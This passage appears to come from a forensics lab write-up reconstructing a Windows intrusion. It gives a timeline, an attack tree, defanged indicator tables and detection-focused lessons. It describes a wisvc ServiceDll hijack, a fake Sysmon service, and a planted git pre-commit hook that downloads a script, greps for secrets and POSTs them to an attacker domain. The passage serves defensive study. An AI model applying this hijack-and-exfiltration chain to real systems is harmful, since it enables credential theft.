| `2026-01-22 13:07:24` | Defense Evasion | Git for Windows installation config `C:\Users\caspery\AppData\Local\Programs\Git\etc\gitconfig` modified to set `core.hooksPath = C:\ProgramData\.git-hooks`, redirecting `caspery`'s interactive git sessions to attacker-controlled hooks | `T1574.004` |
| `2026-01-22 13:10:39` | Collection | First git commit by `caspery` triggered `pre-commit` hook; `s.sh` downloaded from `hxxps://gist.githubusercontent[.]com/ChickenLoner/[gist-id]/raw/[hash]/secret.sh` to `/tmp/s.sh`, executed, then deleted; commit hash `70c08d68cbec8c04ff967616f306e22a21e9aba0` ("delete logs") | `T1119`, `T1059.004` |
| `2026-01-22 13:16:28` | Collection | Second git commit triggered `pre-commit` hook; `s.sh` downloaded, executed, and deleted | `T1119`, `T1059.004` |
| `2026-01-22 13:33:19` | Exfiltration | Third git commit triggered `pre-commit` hook; harvested credential patterns (`password|api[_-]?key|secret|token|...`) exfiltrated via HTTP POST to `hxxp://speecltest[.]xyz/upload`; marker file `.git-scanner-init` created in `%USERPROFILE%` | `T1048.003`, `T1119` |

## Text Tree

```bash
[DLL Hijack — AnyDesk Masquerade]  ← attacker drops gcapl.dll → C:\ProgramData\AnyDesk\
    └── wisvc ServiceDll registry value overwritten  ← 2026-01-21 13:15:02
        └── [Execution — System Reboot]  ← 2026-01-22 11:36:24 UTC
            └── svchost.exe loads gcapl.dll via wisvc  ← 2026-01-22 11:38:11
                ├── [Defense Evasion]
                │   ├── C:\Windows\Temp\wisvc_debug.log created  ← DLL logging cover
                │   ├── C:\Windows\Sysmon.exe installed as "System Monitor"  ← fake Sysinternals Sysmon
                │   │   └── Microsoft-Windows-Sysmon%4Operational.evtx dropped  ← fake event log
                │   └── Git installation config modified  ← 2026-01-22 13:07:24
                │       └── core.hooksPath = C:\ProgramData\.git-hooks
                └── [Persistence — Git Hook]
                    ├── SYSTEM .gitconfig modified  ← 2026-01-22 12:44:36
                    └── C:\ProgramData\.git-hooks\pre-commit dropped  ← 2026-01-22 12:50:22
                        └── [Collection & Exfiltration — on every git commit]
                            ├── downloads secret.sh from hxxps://gist.githubusercontent[.]com/ChickenLoner/[gist-id]/raw/[hash]/secret.sh
                            ├── greps git history for password|api[_-]?key|secret|token|...
                            ├── exfiltrates matches → hxxp://speecltest[.]xyz/upload
                            ├── commit 1: 70c08d68...  ← 2026-01-22 13:10:39 UTC ("delete logs")
                            ├── commit 2: 78999f3d...  ← 2026-01-22 13:16:28 UTC ("add gitignore")
                            └── commit 3: 082f2abb...  ← 2026-01-22 13:33:19 UTC ("Task scheduler friendly")
```

# Artifacts

**Network Indicators**

| Type | Value |
| --- | --- |
| Exfiltration endpoint | `hxxp://speecltest[.]xyz/upload` |
| C2 / script delivery | `hxxps://gist.githubusercontent[.]com/ChickenLoner/d59b614c1e9ed09edf98500e36ab4361/raw/0089171764910b267711cc17eda5b4d3e947d1e0/secret.sh` |

**Host Indicators — Files**

| Type | Value |
| --- | --- |
| Malicious DLL | `C:\ProgramData\AnyDesk\gcapl.dll` |
| DLL debug log | `C:\Windows\Temp\wisvc_debug.log` |
| Fake Sysmon binary | `C:\Windows\Sysmon.exe` |
| Fake Sysmon event log | `C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx` |
| Git hook | `C:\ProgramData\.git-hooks\pre-commit` |
| Temporary exfil script | `C:\Windows\Temp\s.sh` (deleted post-execution) |
| Marker file | `%USERPROFILE%\.git-scanner-init` |

**Host Indicators — Registry**

| Type | Value |
| --- | --- |
| Hijacked service | `HKLM\SYSTEM\ControlSet001\Services\wisvc` |
| Malicious ServiceDll | `C:\ProgramData\AnyDesk\gcapl.dll` |
| Fake service | `HKLM\SYSTEM\ControlSet001\Services\Sysmon` |

**Host Indicators — Git Config**

| Type | Value |
| --- | --- |
| Modified git config (caspery) | `C:\Users\caspery\AppData\Local\Programs\Git\etc\gitconfig` |
| Modified git config (SYSTEM) | `C:\Windows\System32\config\systemprofile\.gitconfig` |
| Injected setting | `core.hooksPath = C:\ProgramData\.git-hooks` |

**Threat Actor Identifiers**

| Type | Value |
| --- | --- |
| GitHub username | `ChickenLoner` |
| Exfil script filename | `secret.sh` |
| Exfil domain | `speecltest[.]xyz` |

**Timeline Anchors**

| Type | Value |
| --- | --- |
| DLL drop | `2026-01-21 13:14:50 UTC` |
| Service hijack | `2026-01-21 13:15:02 UTC` |
| OS reboot / DLL load | `2026-01-22 11:36:24 UTC` |
| Fake Sysmon installed | `2026-01-22 11:46:23 UTC` |
| Git hook dropped | `2026-01-22 12:50:22 UTC` |
| Git config modified | `2026-01-22 13:07:24 UTC` |
| First exfiltration | `2026-01-22 13:10:39 UTC` |

# Lab Insights

- DLL search-order hijacking is surgical and nearly invisible. Replacing a single registry value under an existing legitimate service leaves no new process, no new service name, and no unsigned binary in the service list — the entire privesc lives inside a trusted Microsoft host process. Detection requires correlating ServiceDll values against known-good baselines, not process enumeration.
- Attackers layer config changes across multiple scopes to guarantee execution. Setting `core.hooksPath` in both the SYSTEM account's gitconfig and the Git for Windows installation config ensured the hook fired regardless of whether git ran interactively as the user or programmatically as SYSTEM — a belt-and-suspenders approach that defeats single-scope remediation.
- Git hooks are an underappreciated persistence mechanism that piggybacks on legitimate developer workflow. Unlike scheduled tasks or services, hook execution is triggered entirely by the victim's own actions and produces no anomalous process ancestry — sh.exe spawning from a git commit is expected behavior, making behavioral detection extremely difficult without hook content inspection.
- Resident MFT data is a forensic goldmine when files are absent from the collected artifact. Small files under ~700 bytes store their content directly in the MFR entry, surviving even if the file itself was never collected or has been deleted — three key artifacts in this lab (the pre-commit hook, the SYSTEM `gitconfig`, and the Git installation config) were only recoverable this way.
- The `USN` Journal records the filesystem lifecycle but not execution — Prefetch closes that gap. $J showed the download-write-delete cycle of the temporary script, but execution had to be inferred from the deletion pattern and confirmed independently via Prefetch, which provided direct sh.exe run timestamps and referenced directory paths tying the execution back to the hook.
- Masquerading as legitimate security tooling is a force multiplier for dwell time. Naming a rogue service "System Monitor" and planting a matching fake event log exploits the analyst's instinct to trust familiar monitoring tool names — defenders need baseline inventories of legitimate Sysmon installations (driver hash, config hash, expected log content) to catch this pattern reliably.
- Timestamp correlation across MFT, $J, Prefetch, and event logs is the backbone of timeline reconstruction. No single artifact source told the complete story in this lab — each phase required at least two corroborating sources, and several key timestamps only became meaningful when cross-referenced against others, reinforcing that artifact diversity (not depth in a single source) is what enables precise incident timelines.

# Forensic Timeline

![forensic_timeline.png](forensic_timeline.png)